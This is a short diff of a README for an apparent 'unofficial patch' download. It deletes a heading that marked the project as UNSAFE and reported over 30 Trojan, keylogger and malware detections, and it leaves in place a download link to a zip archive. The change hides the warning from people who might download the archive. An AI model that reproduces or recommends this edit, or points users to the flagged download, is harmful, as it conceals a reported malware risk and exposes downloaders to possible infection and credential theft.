@@ -1,11 +1,4 @@
 
-# [ UNSAFE -> 30+ Trojan Horse / Keylogger / Malware Detections ] TA-Unofficial-Patch-Install
-
-![image](https://github.com/Vigilante-Thaldren/-UNSAFE-TA-Unofficial-Patch-Install/assets/126401549/43884ec7-79e3-42b9-84f4-33b17bf0195b)
-
-
-
-
 **Downloads**
 
 [OTA.Dropin.Install.zip](https://github.com/gammata/TA-Unofficial-Patch-Install/raw/main/OTA.Dropin.Install.zip)\
